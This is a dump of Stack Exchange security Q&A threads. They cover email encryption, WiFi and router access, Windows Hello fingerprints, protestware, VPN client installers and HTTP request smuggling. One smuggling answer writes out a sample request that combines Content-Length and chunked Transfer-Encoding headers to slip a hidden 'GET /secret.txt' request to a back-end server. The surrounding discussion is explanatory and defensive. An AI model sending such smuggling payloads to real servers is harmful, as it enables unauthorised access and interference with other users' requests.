<li>Would using GPG for every email be paranoic?</li>
</ul>
","3","3","260901","<h2>TL;DR</h2>
<p>Your conflating a number of things related to public key cryptography (especially as implemented by OpenPGP as it applies to email), key escrow, data storage, and the way that SMTP works. That makes it hard to answer your question without challenging some of your underlying assumptions.</p>
<p>The ultra-short answer is that ProtonMail offers more privacy guarantees than Gmail, but nothing is perfect and no service can protect you against all possible threats. You need to review your threat model, and see which service most closely aligns with the password escrow concern that <em>appears</em> to be be your topmost concern.</p>
<h2>Examine Your Threat Model: Gmail Isn't a Zero-Knowledge Platform</h2>
<p>While <a href=""https://support.google.com/mail/answer/6330403"" rel=""nofollow noreferrer"">Gmail supports S/MIME</a>, and <a href=""https://safety.google/intl/en_us/gmail/"" rel=""nofollow noreferrer"">claims to support encryption at rest and in transit</a>, <em>your</em> keys, key passwords, and certificates are essentially escrowed by Google's services if you use their native clients. In addition, any encryption applied to transit or at-rest data are owned and managed by Google, so your threat model should assume <em>ab initio</em> that Google always has access to any data and all metadata associated with your emails.</p>
<p>Even if you use a non-Google OpenPGP implementation, depending on the specific implementation details (e.g. whether you're using an in-browser editor or PGP implementation) you should still assume that Gmail has at least some of your message data and all of your metadata. These risks can be mitigated by using out-of-browser implementations, but the email metadata is still exposed because OpenPGP addresses message content rather than SMTP or TCP/IP metadata.</p>
<p>If Gmail, Google, or Alphabet are not potential threat actors in your model, then this may be fine. If they are potential threat actors or threat vectors, then you will want to look at other services that do not escrow keys, have zero-knowledge architectures that do not require trusting the email provider, and that have mechanisms in place to reduce metadata associated with same-provider delivery. Delivery to outside providers will always carry some residual risk for metadata, although the <em>contents</em> of the message can be secured against typical threat models.</p>
<h2>Comparison to ProtonMail</h2>
<p>Your original post mentions &quot;PM,&quot; which one assumes here means ProtonMail. The ProtonMail platform addresses a <a href=""https://protonmail.com/blog/protonmail-threat-model/"" rel=""nofollow noreferrer"">different threat model</a> and is based on a very different business model than Gmail or Google. The company also provides a lot of information about <a href=""https://protonmail.com/support/knowledge-base/what-is-encrypted/"" rel=""nofollow noreferrer"">what is and is not encrypted</a> under different scenarios.</p>
<p>The short summary is that ProtonMail does not escrow key <em>passwords</em>, but can't avoid providing metadata when passing emails outside of itself due to the nature of the SMTP protocol. They also store encrypted versions of your mail and private keys on their servers—although you could certainly use offline keys in the same way you might with another service too—but while this theoretically opens up a vector for brute force attacks against your escrowed keys or at-rest data, this is largely tinfoil hat territory assuming you have an uncompromised key with a strong password. It would be a lot easier to get your data another way rather than trying to simply seize and brute-force your encrypted server-side keys or data within an uncompromised zero-knowledge system.</p>
<p>Of course, barring injected backdoors into the web service or physical servers, ProtonMail could still be legally forced to share metadata about individual users (see the &quot;Not Recommended&quot; section of their threat model) such as IP logging. However, this primarily impacts metadata, not message data, so it's outside the scope of the question you're fundamentally asking regarding private key password escrow.</p>
<p>Their <a href=""https://protonmail.com/blog/transparency-report/"" rel=""nofollow noreferrer"">transparency report</a> and warrant canary was last updated on 6 September 2021, so if <strong>password escrow</strong> is your primary concern then they better fit your threat model. However, if your concerns are different then you should certainly consider revising your threat model and control set to better account for whatever the real issue is.</p>
","2"
"260895","260895","Securing Email: use GPG for all emails?","<p>I am thinking of using GPG to sign commits and particularly to secure emails, and have some questions regarding the usefulness.</p>
<hr />
<p><strong>Basic threat model</strong></p>
<p>(I use LESP as abbreviation for large email service provider)</p>
<p>The data in transit may not be secure <a href=""https://support.google.com/transparencyreport/answer/7381230?hl=en#zippy=%2Chow-does-encryption-in-transit-relate-to-https-access-to-gmail"" rel=""nofollow noreferrer"">if the recipient isn't a LESP user</a>. But that may be rare these days.</p>
<p>Most email data is TLS secured (over the wire) but non-secured at rest - if the service provider holds the private key or the data is not encrypted.</p>
<p>GMail does not seem to encrypt at rest or, if they do, tell much about it (do they have the private key? is it encrypted?). It is not in the <a href=""https://support.google.com/transparencyreport/answer/7381230?hl=en"" rel=""nofollow noreferrer"">transparency report</a>, for example.</p>
<p>ProtonMail instead, uses e2e encryption and it is based in Switzerland. In ProtonMail, the private key is encrypted with a secure passphrase, hence if you lose it you lose access to the data, as it can not be decrypted any more (unless setting up recovery mechanisms).</p>
<p><em>I do not know though, whether they could store a plain text copy of the private key.</em></p>
<p>In any case, the emails to/from LESPs' users won't be secured at rest so I went ahead and create a GPG key. They would also need one to communicate both ways.</p>
<hr />
<p><strong>Question</strong></p>
<ul>
<li>Does GMail or BESPs in general encrypt at rest and own the private key?</li>
<li>Does ProtonMail store the encrypted PK in their server?</li>
<li>Would using GPG for every email be paranoic?</li>
</ul>
","3","3","261340","<p>Email is not an encrypted protocol, so you will forever be herding cats trying to make it into an encrypted protocol.</p>
<p>The purpose of end-to-end encryption tools is to protect the data against all intermediary communications tools because these tools cannot be trusted.</p>
<p>Proton, alone, does not accomplish the same protection as end-to-end encryption because they receive and send messages in the clear with other servers. While they claim that only you have the key to access the messages stored on the server, the messages at some point must be in plain text, which means you are trusting Proton and that defeats the purpose of end-to-end encryption.</p>
<p>A problem I discovered with using GPG for all messages is that you must publicly publish your public key. Shortly, you will begin receiving encrypted spam messages because the spammers know that very powerful spam prevention tools are at the server level, and the servers cannot read the contents of the message, so you are far more likely to open the message, thus bypassing the server spam protection tools. Or maybe I am the only one with this experience, but I doubt it.</p>
","0"
"260859","260859","If someone knows your wifi password can they hack your router?","<p>What exactly can someone do if they know your Wifi password? Can they only see which sites you visit or can they do more? Are they able to hack(router) and do malicious things with your router just by knowing the password?
Is it possible to send a virus through the wifi to the router?</p>
<p>Also can a hacker tell what kind of router you are using just by knowing your wifi password and loging into your wifi?</p>
","2","3","260863","<blockquote>
<p>What exactly can someone do if they know your Wifi password?</p>
</blockquote>
<p>They can access your local network, i.e., your home network that all your home devices (the devices connected to that same wifi router) are on.</p>
<blockquote>
<p>Can they only see which sites you visit or can they do more?</p>
</blockquote>
<p>They can do much more. For example, they can scan all the machines connected to the WiFi (including the router itself) and look for vulnerabilities, etc.</p>
<blockquote>
<p>Also can a hacker tell what kind of router you are using just by knowing your wifi password and loging [sic] into your wifi?</p>
</blockquote>
<p>Likely yes, since your router is likely listening on 192.168.1.1 (or similar) and will likely display an admin page with a bunch of identifying information when you connect to that IP with a web browser.</p>
","0"
"260859","260859","If someone knows your wifi password can they hack your router?","<p>What exactly can someone do if they know your Wifi password? Can they only see which sites you visit or can they do more? Are they able to hack(router) and do malicious things with your router just by knowing the password?
Is it possible to send a virus through the wifi to the router?</p>
<p>Also can a hacker tell what kind of router you are using just by knowing your wifi password and loging into your wifi?</p>
","2","3","260865","<blockquote>
<p>What exactly can someone do if they know your Wifi password?</p>
</blockquote>
<p>A lot of things. Depending on how your network is configured, it could be like having an attacker having wired access to an Ethernet LAN. If your network does not allow client to client traffic, the attacker usually can talk only to the router and won't receive traffic from other computers. If the router does not allow administration access from the wireless network, the attacker can do pretty little on the network.</p>
<blockquote>
<p>Can they only see which sites you visit or can they do more?</p>
</blockquote>
<p>It depends on your network. Usually an attacker will not even be able to see the sites you access. Even if client-to-client is enabled (usually is) and the attacker uses ARP-spoofing to redirect all IP traffic to his computer, most sites today will use TLS and he will not be able to see what you are seeing. DNS traffic is in clear, and the DNS requests could be viewed by the attacker.</p>
<blockquote>
<p>Are they able to hack(router) and do malicious things with your router just by knowing the password?</p>
</blockquote>
<p>They can infer the router make and model, and depending on the configuration of the router they can attack the router. If the router have a default password, or vulnerabilities allowing unauthenticated command execution, they can change router settings. You could protect your router by not allowing connection from the wireless interface, only from the wired interface. This is a setting almost every wireless router have but are disabled by default on the majority of the routers I used.</p>
<blockquote>
<p>Is it possible to send a virus through the wifi to the router?</p>
</blockquote>
<p>Possible? Yes. But not needed. A hacker that have access to the router via wifi will be able to bruteforce the login. Depending on your password, they can access the administration panels without a virus.</p>
<blockquote>
<p>Also can a hacker tell what kind of router you are using just by knowing your wifi password and loging into your wifi?</p>
</blockquote>
<p>It depends on your settings, but generally they can. The router must tell every client the default gateway and network mask by using DHCP, and the attacker can use this information to probe the router. If wireless access is enabled, the attacker can download the login page, send incorrect data, and identify the router by the messages returned.</p>
","2"
"260859","260859","If someone knows your wifi password can they hack your router?","<p>What exactly can someone do if they know your Wifi password? Can they only see which sites you visit or can they do more? Are they able to hack(router) and do malicious things with your router just by knowing the password?
Is it possible to send a virus through the wifi to the router?</p>
<p>Also can a hacker tell what kind of router you are using just by knowing your wifi password and loging into your wifi?</p>
","2","3","264915","<p>If you are using WPA 2 Personal, then there are attacks against the network that can be performed if a hacker can get onto the network, that is if they have <em>someones</em> WiFi password on the WiFi network. I don't know if that would be an attack against the router, but definitely an attack against all other users on the network. Don't know if this is true for WPA 3 Personal, and WPA 2 Enterprise prevents certain types of attacks. So if a company has 500 users on their network and one gives their password to a hacker, that doesn't put the other 499 at risk if they use WPA 2 Enterprise. Of course there can always be other attacks.</p>
","0"
"260823","260823","How exactly is a fingerprint stored in Windows Hello? Why is it claimed to be more secure than a password?","<p>I can't quite imagine a scenario where fingerprints can be stored in a way that defeats the weaknesses of password storage (i.e. pass the hash attacks or password reuse). Moreover, I couldn't quite find a concise explanation of the way Windows Hello stores and compares fingerprint hashes, so I'm wondering how exactly these measures were implemented that make them better than passwords.</p>
<p>What actually happens in a Windows Hello domain? Is there a fuzzy hash of a fingerprint being sent to the domain controller? If you get an image of someone's finger, does that mean the fuzzy hash is compromised forever? Is it possible to get your fingerprint stolen from Windows memory?</p>
","0","3","260870","<blockquote>
<p>How does the fingerprint work?</p>
</blockquote>
<p>In general they use pattern matching algorithms and hashes of various patterns in your finger. I wont pretend to know the exact mechanism, but I am fairly confident that your fingerprint cannot be extracted from stored data.</p>
<blockquote>
<p>Why does Microsoft claim fingerprints are more secure than passwords?</p>
</blockquote>
<p>This likely comes down to psychology rather than the actual mechanism behind verifying fingerprints.
If either the fingerprint or the password verification would have any <em>known</em> major flaws, I would like to think that someone would've fixed them.</p>
<p>However there are multiple non-technical problems with passwords. The average person wants to log into their computer quickly, and thus chooses a short and memorable password (not secure). Passwords can be susceptible to <a href=""https://en.wikipedia.org/wiki/Shoulder_surfing_(computer_security)"" rel=""nofollow noreferrer"">shoulder surfing</a>. And worst of all I personally know people who write their password on their computer using a sticky note. None of these can be done with a fingerprint.</p>
<p>That said, fingerprints are not without their flaws either. However most problems that arise with them wont affect the average person. For example with expensive equipment fingerprints can be extracted from objects you touch. Furthermore, (a fact that hopefully doesn't concern many people) fingerprints have different protections by law, in the United States law enforcement cannot force you to give up any passwords, which is not the same for fingerprints.</p>
<p>The gist of it is that (from my understanding) you are told that fingerprints are more secure, as they are for most users. As for the few for whom its not enough, they should probably use both.</p>
","0"
"260823","260823","How exactly is a fingerprint stored in Windows Hello? Why is it claimed to be more secure than a password?","<p>I can't quite imagine a scenario where fingerprints can be stored in a way that defeats the weaknesses of password storage (i.e. pass the hash attacks or password reuse). Moreover, I couldn't quite find a concise explanation of the way Windows Hello stores and compares fingerprint hashes, so I'm wondering how exactly these measures were implemented that make them better than passwords.</p>
<p>What actually happens in a Windows Hello domain? Is there a fuzzy hash of a fingerprint being sent to the domain controller? If you get an image of someone's finger, does that mean the fuzzy hash is compromised forever? Is it possible to get your fingerprint stolen from Windows memory?</p>
","0","3","260889","<p>Fingerprint is not that different from password, it is just an other way of &quot;inputting&quot; some information that can authenticate someone.</p>
<p><a href=""https://i.stack.imgur.com/HxE8t.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/HxE8t.png"" alt=""Minutiae extraction"" /></a></p>
<p>The software looks for the locations of multiple identifiable points (<em>Minutiae extraction</em>) on the fingerprint &quot;map&quot; and stores the hashes of these location vectors. So actually a set of hashes are being compared (looking for a partial match) to an other set during authentication. Everything else - i.e.: encrypted channel for the not yet hashed values, hash algo, etc. - is the same as for password authentication, except that it's a bit harder to change your fingerprint.</p>
<p>An other thing is how hard is it to &quot;input&quot; a stolen fingerprint into the sensor. Optical sensors can be easily compromies with a printed image of the fingerprint. With CMOS sensors it's harder.</p>
<p>It's more useful as a second factor for authentication.</p>
","0"
"260823","260823","How exactly is a fingerprint stored in Windows Hello? Why is it claimed to be more secure than a password?","<p>I can't quite imagine a scenario where fingerprints can be stored in a way that defeats the weaknesses of password storage (i.e. pass the hash attacks or password reuse). Moreover, I couldn't quite find a concise explanation of the way Windows Hello stores and compares fingerprint hashes, so I'm wondering how exactly these measures were implemented that make them better than passwords.</p>
<p>What actually happens in a Windows Hello domain? Is there a fuzzy hash of a fingerprint being sent to the domain controller? If you get an image of someone's finger, does that mean the fuzzy hash is compromised forever? Is it possible to get your fingerprint stolen from Windows memory?</p>
","0","3","266061","<p>I don't mean to be pedantic, but the fingerprint hash vs the password hash is not what makes a fingerprint authentication in WHFB more secure than a simple password (though the reality is that a fingerprint hash will be infinitely more difficult to crack than even a complex password hash). The real security, however, is in the method of authentication: Once the fingerprint is verified, the FIDO mechanism kicks in, which exchanges public/private keys, validates an account, and simply validates a kerberos ticket (in an AD environment) for login. There is no need to A) transmit the password hash across the network in order to verify an identity and B) because the private key is stored in a client-side TPM, it can only be used on that physical hardware. So you've eliminated the two most common account takeover tactics, which are credential theft and credential replay. Even the WHFB Pincode is orders of magnitude more secure than a password, unless your only security concern is shoulder-surfing, in which case: use biometrics.</p>
","1"
"260722","260722","Does open source ""protestware"" represent a security risk?","<p>Since the beginning of the Ukraine-Russian war, a new kind of software was created, which is called &quot;protestware&quot;.</p>
<p>In the best case, the devs only add some (personal) statements about the war or uncensored information to the repositories or when starting the application. Since Github and other platforms are not banned in Russia, this could help to reach users and provide them with news.</p>
<p>The open source initiative wrote in a <a href=""https://opensource.org/blog/open-source-protestware-harms-open-source"" rel=""noreferrer"">blog post</a>, that's ok to add a personal statement or add some commit messages with information about the war to reach users with uncensored information.</p>
<p>But there are also projects which add malicious behavior. One example is the &quot;node-ipc package&quot;, which deletes files depending on the geolocation. The affected versions also have their own CVE (<a href=""https://nvd.nist.gov/vuln/detail/CVE-2022-23812"" rel=""noreferrer"">CVE-2022-23812</a>) which was rated with a CVSS of 9.8.</p>
<p>From a security perspective, it's best practice to install the latest version, which should fix security issues but not introduce new ones as a &quot;feature&quot;.</p>
<p>But the node-ipc module showed that each maintainer/developer can add bad behavior to the software as a political statement.</p>
<p><strong>Question:</strong></p>
<ul>
<li>New software versions can be used as a political statement. As a
user, should I be concerned about political messages in software?</li>
<li>What should I do to mitigate malicious behavior?
<ul>
<li>I can't review the code of all used libraries and applications.</li>
<li>A lot of users do not have the knowledge to understand the code.</li>
</ul>
</li>
</ul>
","56","3","260724","<p>Political statements in software can be a concern for a few reasons:</p>
<ul>
<li>The may result in the software being banned in your country, so you should plan for that eventuality.</li>
<li>They may result in the software being targeted (for example, the Notepad++ GitHub has been <a href=""https://github.com/notepad-plus-plus/notepad-plus-plus/issues?q=is%3Aissue+is%3Aclosed+china"" rel=""noreferrer"">repeatedly spammed</a> by Chinese accounts over its various <a href=""https://notepad-plus-plus.org/downloads/"" rel=""noreferrer"">version names</a>). And this may turn into more dangerous attacks which could compromise the software.</li>
<li>It may indicate that the author is more likely to make actual changes to the software down the line.</li>
<li>It suggests that the software is <em>probably</em> developed by an individual, which can make it more fragile and susceptible various issues.</li>
</ul>
<p>But if the software actively does something malicious, then it's not &quot;protestware&quot;. It's just malware. So  you should treat it the same as if the software decided to bundle a password stealer/cryptominer/ransomware/etc - using your existing  supply chain and dependency management processes.</p>
<p>The author(s) should also be blacklisted in your internal processes so that you don't use anything they have written (or anything that depends on them) again.</p>
<p>It's also worth nothing that this isn't really anything to do with &quot;open source&quot;. Adding political messages to software is just as easy with closed source projects, and adding malicious code is <em>much easier</em>, because it's harder to detect. Because of this, a lot of organisations are advising against using software from unfriendly countries (such as the FCC <a href=""https://www.fcc.gov/supplychain/coveredlist"" rel=""noreferrer"">recently stating</a> that Kaspersky is considered an &quot;unacceptable risk to national security&quot;).</p>
","85"
"260722","260722","Does open source ""protestware"" represent a security risk?","<p>Since the beginning of the Ukraine-Russian war, a new kind of software was created, which is called &quot;protestware&quot;.</p>
<p>In the best case, the devs only add some (personal) statements about the war or uncensored information to the repositories or when starting the application. Since Github and other platforms are not banned in Russia, this could help to reach users and provide them with news.</p>
<p>The open source initiative wrote in a <a href=""https://opensource.org/blog/open-source-protestware-harms-open-source"" rel=""noreferrer"">blog post</a>, that's ok to add a personal statement or add some commit messages with information about the war to reach users with uncensored information.</p>
<p>But there are also projects which add malicious behavior. One example is the &quot;node-ipc package&quot;, which deletes files depending on the geolocation. The affected versions also have their own CVE (<a href=""https://nvd.nist.gov/vuln/detail/CVE-2022-23812"" rel=""noreferrer"">CVE-2022-23812</a>) which was rated with a CVSS of 9.8.</p>
<p>From a security perspective, it's best practice to install the latest version, which should fix security issues but not introduce new ones as a &quot;feature&quot;.</p>
<p>But the node-ipc module showed that each maintainer/developer can add bad behavior to the software as a political statement.</p>
<p><strong>Question:</strong></p>
<ul>
<li>New software versions can be used as a political statement. As a
user, should I be concerned about political messages in software?</li>
<li>What should I do to mitigate malicious behavior?
<ul>
<li>I can't review the code of all used libraries and applications.</li>
<li>A lot of users do not have the knowledge to understand the code.</li>
</ul>
</li>
</ul>
","56","3","260741","<blockquote>
<p>What should I do to mitigate malicious behavior?</p>
<p>I can't review the code of all used libraries and applications.</p>
</blockquote>
<p>Agreed. Very, very few shops can afford to review all dependencies in depth.</p>
<p>But that is, IMHO, no excuse to (automatically) pull untested and unverified dependencies:</p>
<ul>
<li>When you get a new dependency, you at least smoke test it.</li>
<li>When you upgrade your <a href=""https://docs.npmjs.com/cli/v8/configuring-npm/package-lock-json"" rel=""noreferrer""><code>package-lock.json</code></a>, you check what packages changed: In most situations, you can't verify them all in detail, but you can run an internal test of your software for any obvious malicious behavior.</li>
</ul>
","6"
"260722","260722","Does open source ""protestware"" represent a security risk?","<p>Since the beginning of the Ukraine-Russian war, a new kind of software was created, which is called &quot;protestware&quot;.</p>
<p>In the best case, the devs only add some (personal) statements about the war or uncensored information to the repositories or when starting the application. Since Github and other platforms are not banned in Russia, this could help to reach users and provide them with news.</p>
<p>The open source initiative wrote in a <a href=""https://opensource.org/blog/open-source-protestware-harms-open-source"" rel=""noreferrer"">blog post</a>, that's ok to add a personal statement or add some commit messages with information about the war to reach users with uncensored information.</p>
<p>But there are also projects which add malicious behavior. One example is the &quot;node-ipc package&quot;, which deletes files depending on the geolocation. The affected versions also have their own CVE (<a href=""https://nvd.nist.gov/vuln/detail/CVE-2022-23812"" rel=""noreferrer"">CVE-2022-23812</a>) which was rated with a CVSS of 9.8.</p>
<p>From a security perspective, it's best practice to install the latest version, which should fix security issues but not introduce new ones as a &quot;feature&quot;.</p>
<p>But the node-ipc module showed that each maintainer/developer can add bad behavior to the software as a political statement.</p>
<p><strong>Question:</strong></p>
<ul>
<li>New software versions can be used as a political statement. As a
user, should I be concerned about political messages in software?</li>
<li>What should I do to mitigate malicious behavior?
<ul>
<li>I can't review the code of all used libraries and applications.</li>
<li>A lot of users do not have the knowledge to understand the code.</li>
</ul>
</li>
</ul>
","56","3","260761","<h1>Obviously yes</h1>
<p>... but not because it is protestware.</p>
<p>Here's the bottom line: open-source software is something your org doesn't control. The people who wrote it have no legal obligations to your org for the simple and obvious reason that neither they nor your org have undertaken to form a relationship by which you could hold each other accountable. That is true whether or not the software in question is &quot;protestware.&quot;</p>
<p>The truth is that anybody who uses software they didn't write is putting their fate in someone else's hands. The only thing that sets protestware apart is that we <em>think</em> we know the reason the software doesn't do what it says it does -- that reason being that the actual authors have deliberately broken their software as an act of political protest. But significant breakage can happen even when everyone is trying to do a good job: I remember back in 2016 there was an innocent problem with some widely-used library that ended up breaking everyone's webpack builds for something like 24 hours.</p>
<p>A person doesn't need a war to justify that kind of action. They don't even need a reasonable belief: there are plenty of very smart programmers out there who are also tin-foil-hat crazy. And the other side of that coin is that there are some organizations that a sane person would be <em>justified</em> in subverting. None of this changes the fact that every organization is 100% responsible for taking appropriate safeguards to prevent outsiders from interfering, deliberately or otherwise, with the pursuit of that org's objectives.</p>
<p>The onus is, <strong>and always has been</strong>, on consumers of third-party software to take precautions against the possibility that the software they consume may change in a way they don't like. That's true whether or not their goals diverge from the goals of the random outsiders whose software they consume. The &quot;advent&quot; of protestware does not change that fact whatsoever.</p>
","4"
"260681","260681","VPN client compiled by the VPN server?","<p>Is it normal for a physical VPN service to generate/compile the exe for the VPN client? I don't know that much about VPNs, so this might be normal - but a client uses Sophos VPN, and they're saying they want to email me an exe to install for the VPN client. I've asked if I can download the client directly from Sophos's website (as I have sensitive client information on my machine - and don't want to install random exe's people have emailed to me). They're saying that the VPN server on-premise generates the VPN client executable, and mentioned something about a profile. This seems really odd to me - surely people should be discouraged from installing exes from non-official websites?</p>
","0","3","260682","<p>The VPN client likely has settings and certificates specific to this connection and server. Such that, you cannot use it for any other connection.</p>
<p>Compiling these things into the binary means that it is much more difficult for someone to steal or reverse engineer the settings and gain unauthorised access to their VPN. I've seen this before.</p>
<p>So, in short, perfectly normal.</p>
","2"
"260681","260681","VPN client compiled by the VPN server?","<p>Is it normal for a physical VPN service to generate/compile the exe for the VPN client? I don't know that much about VPNs, so this might be normal - but a client uses Sophos VPN, and they're saying they want to email me an exe to install for the VPN client. I've asked if I can download the client directly from Sophos's website (as I have sensitive client information on my machine - and don't want to install random exe's people have emailed to me). They're saying that the VPN server on-premise generates the VPN client executable, and mentioned something about a profile. This seems really odd to me - surely people should be discouraged from installing exes from non-official websites?</p>
","0","3","260684","<p>I've seen an instance of <a href=""https://www.fortinet.com/support/product-downloads"" rel=""nofollow noreferrer"">another VPN solution</a> which does something similar. You can download an installer which includes the VPN configuration (VPN server, server certificate, etc.). The settings are included in an XML file which is easily extracted (using <code>strings</code>) from the installer. In this case, you could definitely extract the settings without running the binary and use them from the official client found on the official website.</p>
<p>In summary, this appears to package the installer with the provisioning configuration <strong>for convenience</strong>.</p>
","1"
"260681","260681","VPN client compiled by the VPN server?","<p>Is it normal for a physical VPN service to generate/compile the exe for the VPN client? I don't know that much about VPNs, so this might be normal - but a client uses Sophos VPN, and they're saying they want to email me an exe to install for the VPN client. I've asked if I can download the client directly from Sophos's website (as I have sensitive client information on my machine - and don't want to install random exe's people have emailed to me). They're saying that the VPN server on-premise generates the VPN client executable, and mentioned something about a profile. This seems really odd to me - surely people should be discouraged from installing exes from non-official websites?</p>
","0","3","260708","<p>As other answers stated, this is quite normal. There are several reasons to do this:</p>
<ul>
<li>As already mentioned, it allows the server administrator to include the VPN configuration data as part of the installer, thus giving a one-click experience to less technically savvy users and reducing the burden on IT support.</li>
<li>It ensures that the server and client are running mutually compatible software versions, again reducing the burden on IT support.</li>
</ul>
<p>For some VPN solutions, you cannot even get the client any other way. You can <em>only</em> get it from the VPN server. This includes some of the big brands such as Cisco or Palo Alto Networks.</p>
<p>It is generally not a good idea to allow devices which are not under your control access to your network, especially since the whole point of a VPN is to gain access to networks that you would normally not have access to. Therefore, lots of VPN clients now include full endpoint security solutions that allow the VPN administrator wide range access to your device in order to ensure that it is compliant with their security requirements.</p>
<p>That is yet another reason for the VPN administrator to ensure that you only use the exact client with the exact configuration they gave you.</p>
<blockquote>
<p>as I have sensitive client information on my machine - and don't want to install random exe's people have emailed to me</p>
</blockquote>
<p>There is an unfortunate stalemate here: you want your computer to be protected from them, so you don't want to give them any access to it, but they want their network to be protected from your computer, so they need access to it.</p>
<p>There is no easy solution to this. My employer does it by only allowing access to the VPN from company laptops. In order to access customer's VPNs, we have a pool of VMs in our vSphere cluster that sit inside a DMZ. These VMs have only the VPN client for the customer installed plus any tools to perform our maintenance tasks. They do not have access to the company network nor to each other, thus making it safe to give up control to the VPN administrator.</p>
<p>Some customers send us laptops with the VPN client pre-installed that we have use to connect to their network. Some customers don't use those strict endpoint security settings on the VPN client machine, instead they allow only access to one single port of one single IP which is a &quot;jumphost&quot; VM we can remote into which then has all the security settings applied.</p>
<p>But the fundamental problem of you wanting to use your own machine and not give up control and the VPN admin wanting to have control on the machine to ensure the security of the network is unsolvable. Someone has to give up something: either the VPN admin needs to give up control or you need to give up control or you need to give up on using your own machine.</p>
","1"
"260679","260679","Is a HTTP Request Smuggling a concern when using load balancers?","<p><a href=""https://nvd.nist.gov/vuln/detail/CVE-2022-22720"" rel=""nofollow noreferrer"">CVE-2022-22720</a> (Apache HTTP Server 2.4.52 vulnerability) mentions that the risk is with HTTP Request Smuggling.</p>
<p>My understanding of HTTP Request Smuggling is that a front server A transmits to a back server B a request. That request can be &quot;enriched&quot; with extra contact that gets interpreted by server B.</p>
<p>I see how this can be a problem when server A has some intelligence about how to process the request. An example would be that it terminates a call, makes some authorization decisions and requests something from B, <strong>that B provides blindly</strong>.</p>
<p><strong>But if A is only a load balancer and the request that reaches B is fully authorized by B?</strong> Would HTTP Request Smuggling still be an issue? (this scenario is globally similar to B being on the front, it is pushed to the back for performance/availability reasons)</p>
","1","3","260688","<p>Here is nice explanation of request smuggling: <a href=""https://portswigger.net/web-security/request-smuggling"" rel=""nofollow noreferrer"">https://portswigger.net/web-security/request-smuggling</a></p>
<p>I'd say that request smuggling would be possible even if front server is just a load balancer.</p>
<p>From the linked document:</p>
<blockquote>
<p>Most HTTP request smuggling vulnerabilities arise because the HTTP
specification provides two different ways to specify where a request
ends: the Content-Length header and the Transfer-Encoding header.</p>
</blockquote>
<p>For example: Attacker sends both Content-Length and Transfer-Encoding: chunck -header. Front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header. Header is passed as-is to back end and here we go.</p>
","2"
"260679","260679","Is a HTTP Request Smuggling a concern when using load balancers?","<p><a href=""https://nvd.nist.gov/vuln/detail/CVE-2022-22720"" rel=""nofollow noreferrer"">CVE-2022-22720</a> (Apache HTTP Server 2.4.52 vulnerability) mentions that the risk is with HTTP Request Smuggling.</p>
<p>My understanding of HTTP Request Smuggling is that a front server A transmits to a back server B a request. That request can be &quot;enriched&quot; with extra contact that gets interpreted by server B.</p>
<p>I see how this can be a problem when server A has some intelligence about how to process the request. An example would be that it terminates a call, makes some authorization decisions and requests something from B, <strong>that B provides blindly</strong>.</p>
<p><strong>But if A is only a load balancer and the request that reaches B is fully authorized by B?</strong> Would HTTP Request Smuggling still be an issue? (this scenario is globally similar to B being on the front, it is pushed to the back for performance/availability reasons)</p>
","1","3","264283","<p>Request smuggling attacks involve placing both the Content-Length header and the Transfer-Encoding header into a single HTTP request and manipulating these so that the front-end and back-end servers process the request differently.</p>
<p>With any more than one server interpreting responses you will be at risk of HTTP
Request Smuggling. Here is an example:</p>
<pre><code>POST / HTTP/1.1
Host: yourwebsite.com
Transfer-Encoding: chunked
Content-Length: 53

0

GET /secret.txt HTTP/1.1
Host: yourwebsite.com   
Foo: x     
</code></pre>
<p>Because the content-length header is set to 53, the front end will interpret the request completely normally. But if the back end utilizes chunked encoding, it will read the request entirely different. The back end will see this request cut off at the &quot;0&quot;, and anything beyond that 0 will be interpreted as an entire new request. This will usually be appended ON TOP of the next person requesting anything from the web server. That is why the &quot;Foo: x&quot; header is included. The back end server will see the next web request like so:</p>
<pre><code>GET /secret.txt HTTP/1.1
Host: yourwebsite.com   
Foo: xGET / HTTP1.1Host:yourwebsite.com
</code></pre>
<p>As for the next user requesting, their request is completely ignored because the header is ignored.<br>
At that point, because the request has made it to the back end, it is trusted by the back end server (in your situation a load balancer) and either a response is given or it is passed on further.</p>
","3"
"260679","260679","Is a HTTP Request Smuggling a concern when using load balancers?","<p><a href=""https://nvd.nist.gov/vuln/detail/CVE-2022-22720"" rel=""nofollow noreferrer"">CVE-2022-22720</a> (Apache HTTP Server 2.4.52 vulnerability) mentions that the risk is with HTTP Request Smuggling.</p>
<p>My understanding of HTTP Request Smuggling is that a front server A transmits to a back server B a request. That request can be &quot;enriched&quot; with extra contact that gets interpreted by server B.</p>
<p>I see how this can be a problem when server A has some intelligence about how to process the request. An example would be that it terminates a call, makes some authorization decisions and requests something from B, <strong>that B provides blindly</strong>.</p>
<p><strong>But if A is only a load balancer and the request that reaches B is fully authorized by B?</strong> Would HTTP Request Smuggling still be an issue? (this scenario is globally similar to B being on the front, it is pushed to the back for performance/availability reasons)</p>
","1","3","264439","<p>Request smuggling is about altering the number of messages in the HTTP protocol. You think there's only one message (like, one request, or one response) and another actor thinks there's more (like 1, 2 or 1 and half, etc.). It could also be that the load balancer counts 2 and the backends is counting 3, etc.</p>
<p>They're a lot of ways to make this happen. Usually you try to make information about the size of the message hazardous. And to do that you exploit strange HTTP syntax (doubling headers, conflicting headers, oversized attributes, control characters, bad timings, ...).</p>
<p>Being a Load Balancer OR being the backend server is sometimes not very important, usually a successful attack requires having different software on the load balancer and the backend server, that's important to get different interpretation of the same stream by the 2 actors.</p>
<p>Also, very important, <strong>HTTP pipelining</strong> is a key feature (introduced in HTTP/1.1, and it's not just Keepalive, it's having several chained messages). With pipelining you allow the stream of HTTP content to contain more than 1 message, this explains why a load balancer can be impacted by several responses when only one is expected, or why a backend can think there's more than 1 request while the load balancer thinks only one request was sent. Without pipelining any of the actor would just cut the stream after the first message.</p>
<p>One of the protection in HTTP servers against this bad usage of HTTP (altering the number of messages) is that this will usually generate bad queries, errors, that will generate either <code>400: Bad request</code> or some <code>50x</code> messages. Because the attacker is playing with parsing issues. And the HTTP RFC states that <strong>any error message MUST also close the connection</strong> (with the header <code>Connection: close</code> <strong>and</strong> the tcp/ip socket really closed after that). It also states several times that strange syntax should generates errors.</p>
<p>This prevents some of the smuggling attacks, where the hidden query of hidden response would come after an error. If you close the communication channel any remaining content cannot harm any of the actors. So, <em>send error</em>, <strong>and</strong> <em>close the channel</em> after sending the error.</p>
<p>The linked CVE talks about not implementing this protection with error messages (closing the http pipeline by closing the keepalive channel when emiting errors), or not doing it well enough (maybe a read buffer was not flushed from the remaining data, for example).</p>
